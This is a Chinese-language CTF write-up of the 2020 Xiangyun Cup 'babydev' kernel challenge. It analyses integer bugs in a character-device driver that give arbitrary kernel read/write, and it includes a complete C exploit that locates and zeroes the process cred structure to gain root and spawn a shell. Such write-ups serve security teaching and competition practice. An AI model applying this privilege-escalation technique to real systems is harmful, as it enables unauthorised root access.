# 2020祥云杯babydev详解

阅读量 **225397**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2020-11-27 10:30:22

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

## 程序分析

首先打开文件系统查看初始化的脚本`init`

    
    
    #!/bin/sh
    
    mount -t proc none /proc
    mount -t sysfs none /sys
    mount -t devtmpfs devtmpfs /dev
    chown root:root flag
    chmod 400 flag
    exec 0</dev/console
    exec 1>/dev/console
    exec 2>/dev/console
    
    insmod mychrdev.ko
    chmod 777 /dev/mychrdev
    echo -e "\nBoot took $(cut -d' ' -f1 /proc/uptime) seconds\n"
    setsid cttyhack setuidgid 1000 sh
    
    poweroff -d 0  -f
    

发现程序加载了一个`mychrdev.ko`的模块，漏洞就应该在这个内核模块中。看名字应该是一个字符设备的驱动程序。

将这个模块从文件系统中拷贝出来，用IDA打开它，进行分析。可以看到程序主要有几个主要的函数`llseek`，`read`，`write`，`open`，`ioctl`。

![](https://p0.ssl.qhimg.com/t017fb63233aee362b5.png)

结合模块的名字大致能知道每个函数的作用，`read`，`write`，`open`就是重写了`orw`操作，`ioctl`大概是它自定义了一个操作，`llseek`实现的就是重定位读写指针的功能。

### `ioctl`

![](https://p5.ssl.qhimg.com/t01d7920e553c08340f.png)

这个函数通过`0x1111`命令泄漏了一些信息给我们。通过它我们能知道`v9`,`v10`,`v11`,`v12`和`md`的值。通过分析我们知道`v9`是当前的进程号，`v10`是当前程序的名称，`v11`,`v12`缓冲区的一些信息，`md`则直接将缓冲区的地址`mydata`告诉了我们。

###  `read`，`write` && `llseek`

驱动程序主要维护三个值，一个是文件的读写指针，没次打开文件的时候都会被重新设置为0；文件的头指针，指向文件内容开始的地方，它存放在`mydata+0x10000`中，表示文件内容的起始地址相对于`mydata`的偏移；三是文件的大小，它存放在`mydata+0x1008`中。

在`llseek`中可以重制文件指针的值，并且返回重制以后文件指针的值。它有三种模式

  * 当`mod==0`时，会重制文件指针为`a2`
  * 当`mod==1`时，将文件指针跳转到`当前地址+a2`的位置
  * 当`mod==2`时，会将指针跳到文件倒数第`|a2|`（这里a2要是个负数）个位置

**这里可以看到`llseek`无法将文件指针设置为一个负数。**

![](https://p4.ssl.qhimg.com/t01517b4bc23fa1c28d.png)

查看`read`函数，在`copy_to_user`函数第二个参数`s_n + base +
mydata`表示要拷贝的内核空间的地址，这里存在一个整型漏洞，`s_n+base`是负数的时候就可以跳转到`my_data`之前的地址。其中s_n是文件指针的值，我们无法通过`llseek`将其设置为负数，
**因此要想跳到`my_data`之前的位置进行操作要考虑在`base`上（`mydata+0x10000`）做文章**。

![](https://p0.ssl.qhimg.com/t01eecd1e7a2f21fc2f.png)

查看write函数，发现其同样存在整型漏洞，只要能将`my_data+0x10000`的位置，设置为负数就能够对mydata之前的地址进行操作。

![](https://p0.ssl.qhimg.com/t01e5d9e08f9b6f4a39.png)

仔细观察发现write还有一个漏洞。`*(_QWORD *)(mydata + 0x10008) +=
n;`每次写成功之后都会吧写的内容的大小加到`mydata +
0x10008`上，和`llseek`配合就能够使得`mydata+0x10008`值超过`0x10000`，使得我们能够通过`write`随意修改`mydata+0x10000`和`mydata+0x10008`上的内容，从而实现对任意地址的读写操作。

## 漏洞利用

首先为了绕过`write`的检查，先写`0x10000`的内容，再将文件指针设置为`0`，再写`0x10000`的内容上去使得`my_data+0x10008`的值变成0x20000，这样就能随意写`my_data+0x10000`和`my_data+0x10008`的内容。

    
    
    int fd = open("/dev/mychrdev", O_WRONLY);
        u_char buf[0x10010];
        memset(buf, 0, sizeof buf);
        for (int i = 0; i < 2; i++)
        {
            long n = write(fd, buf, 0x10000);
            lseek(fd, 0, 0);
        }
        close(fd);
    

然后我们就能够对任意地址进行读写，因为进程的`cred`结构在`mydata`之前，我们就主要跳到`mydata`之前进行操作。

    
    
            fd = open("/dev/mychrdev", O_WRONLY);
            int n = lseek(fd, pos, 0);
    
            *(size_t *)buf = -(long long)(addr >> 8);
            *(size_t *)(buf + 8) = 0x100000000000LL;
            n = write(fd, buf, 0x1000);
            // printf("%x\n\n", n);
            close(fd);
    
            memset(buf, 0, sizeof buf);
            fd = fd = open("/dev/mychrdev", O_RDONLY);
            n = lseek(fd, 0, 0);
            // printf("%d\n", n);
            n = read(fd, buf, 0x10000);
            // printf("%d\n\n", n);
            close(fd);
    

利用`char target[16] = "try2findmep4nda";prctl(PR_SET_NAME,
target);`将`target`写进内核空间中，在内核空间中`target`的那个地址靠近`cred指针`，因此只要利用任意读爆破出它的地址就能够知道`cred`地址，利用任意写将`cred`中的前`0x28`个字节设置为0。这里可以参考[P4nda大神的博客](http://p4nda.top/2018/11/07/stringipc/)。

    
    
        print_hex(buf,0x100);
        printf("\n");
        for(int i=0;i<0x28;i++)
        {
            buf[i]=0;
        }
        print_hex(buf, 0x100);
    

最后实现提权。

![](https://p1.ssl.qhimg.com/t017836e847736399f2.png)

## EXP

    
    
    #include <string.h>
    #include <stdio.h>
    #include <stdlib.h>
    #include <unistd.h>
    #include <fcntl.h>
    #include <sys/stat.h>
    #include <sys/types.h>
    #include <sys/ioctl.h>
    #include <sys/prctl.h>
    
    size_t heap;
    
    void id()
    {
        printf("uid:%d\n", getuid());
    }
    
    void show()
    {
        int fd = open("/dev/mychrdev", O_RDONLY);
        u_char buf[0x100];
    
        ioctl(fd, 0x1111, buf);
        u_char *p = buf;
        printf("%d\n", *(int *)p);
        p += 4;
        printf("%s\n", p);
        p += 0x10;
        printf("0x%x\n", *(int *)p);
        p += 4;
        printf("0x%x\n", *(long *)p);
        p += 8;
        printf("%p\n", *(size_t *)p);
        heap = *(size_t *)p;
        close(fd);
    }
    
    void print_hex(char *buf, size_t len)
    {
        int i;
        for (i = 0; i < ((len / 8) * 8); i += 8)
        {
            printf("0x%lx", *(size_t *)(buf + i));
            if (i % 16)
                printf(" ");
            else
                printf("\n");
        }
        printf("\n");
    }
    
    int main()
    {
    
        id();
    
        show();
    
        int fd = open("/dev/mychrdev", O_WRONLY);
        u_char buf[0x10010];
        memset(buf, 0, sizeof buf);
        for (int i = 0; i < 2; i++)
        {
            long n = write(fd, buf, 0x10000);
            lseek(fd, 0, 0);
        }
        close(fd);
    
    
        size_t addr = 0x10000, pre_addr = 0;
        size_t cred, real_cred, target_addr;
        char target[16] = "try2findmep4nda";
        prctl(PR_SET_NAME, target);
        for (;; pre_addr = addr, addr += 0x10000)
        {
            // printf("pre_addr:0x%lX\n",heap-pre_addr);
            // printf("addr:0x%lX\n", heap-addr);
            size_t pos = pre_addr + 0x10001;
            // printf("pos:0x%lx\n", pos);
    
            fd = open("/dev/mychrdev", O_WRONLY);
            int n = lseek(fd, pos, 0);
            // printf("0x%x\n", n);
            // *(size_t *)buf = -0x10000LL;
            *(size_t *)buf = -(long long)(addr >> 8);
            *(size_t *)(buf + 8) = 0x100000000000LL;
            n = write(fd, buf, 0x1000);
            // printf("%x\n\n", n);
            close(fd);
    
            memset(buf, 0, sizeof buf);
            fd = fd = open("/dev/mychrdev", O_RDONLY);
            n = lseek(fd, 0, 0);
            // printf("%d\n", n);
            n = read(fd, buf, 0x10000);
            // printf("%d\n\n", n);
            close(fd);
    
            if (n != -1)
            {
                u_int result = memmem(buf, 0x10000, target, 16);
                if (result)
                {
                    size_t temp = buf + result - (u_int)buf;
                    real_cred = *(size_t *)(temp - 0x10);
                    // target_addr = heap - addr + result - (u_int)(buf);
                    break;
                }
            }
            else
            {
                break;
            }
        }
    
        pre_addr=addr;
        size_t mod=(real_cred>>16)<<16;
        addr=heap-mod;
        size_t p_pos=real_cred-mod;
    
        // printf("%p\n", pre_addr);
        // printf("%p\n", addr);
        // printf("%p\n", mod);
        // printf("%p\n", p_pos);
    
        fd = open("/dev/mychrdev", O_WRONLY);
        size_t pos = pre_addr + 0x10001;
        int n = lseek(fd, pos, 0);
        *(size_t *)buf = -(long long)(addr >> 8);
        *(size_t *)(buf + 8) = 0x100000000000LL;
        n = write(fd, buf, 0x1000);
        // printf("%x\n\n", n);
        close(fd);
    
        memset(buf, 0, sizeof buf);
        fd = fd = open("/dev/mychrdev", O_RDONLY);
        n = lseek(fd, p_pos, 0);
        // printf("%d\n", n);
        n = read(fd, buf, 0x100);
        // printf("%d\n\n", n);
        close(fd);
    
        // print_hex(buf,0x100);
        // printf("\n");
        for(int i=0;i<0x28;i++)
        {
            buf[i]=0;
        }
        // print_hex(buf, 0x100);
    
        fd = fd = open("/dev/mychrdev", O_WRONLY);
        n = lseek(fd, p_pos, 0);
        // printf("%d\n", n);
        n = write(fd, buf, 0x100);
        // printf("%d\n\n", n);
        close(fd);
    
        id();
        // close(fd);
    
        system("/bin/sh");
    
        return 0;
    }
    

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **xKaneiki** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/223468](/post/id/223468)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [CTF](/tag/CTF)

 **+1** __9赞

 __收藏

![](https://thirdwx.qlogo.cn/mmopen/vi_32/PiajxSqBRaEIqAgZyAxJkhD0UFto5BTficgl6bvH7w9oqRSjib2Rb3Kwhfo2oU1hBVwFT1FQtPMCjKic5kK06D3SbQ/132)
xKaneiki

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

